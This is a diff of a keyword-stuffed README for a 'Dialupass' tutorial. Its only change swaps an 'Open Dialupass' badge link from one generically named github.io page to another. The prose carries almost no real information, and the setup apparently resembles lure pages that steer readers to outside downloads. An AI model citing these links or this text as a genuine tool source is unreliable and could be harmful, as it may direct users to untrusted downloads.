@@ -1,6 +1,6 @@
 # Dialupass Tutorial - Dial Up Vpn For Efficient Setup And Reliable Everyday Results
 
-[![Open Dialupass](https://img.shields.io/badge/Open-dialupass-8e44ad?style=social&logo=visualstudiocode)](https://complete-resource-analysis-suite.github.io/.github/dialupass-tutorial)
+[![Open Dialupass](https://img.shields.io/badge/Open-dialupass-8e44ad?style=social&logo=visualstudiocode)](https://precision-performance-measurement-tools.github.io/.github/dialupass-tutorial)
 
 ## What is Dialupass
 Dialupass connects dialupass-download and dialupass-setup to how teams actually search for tooling in real desktop environments, not just marketing glossaries.
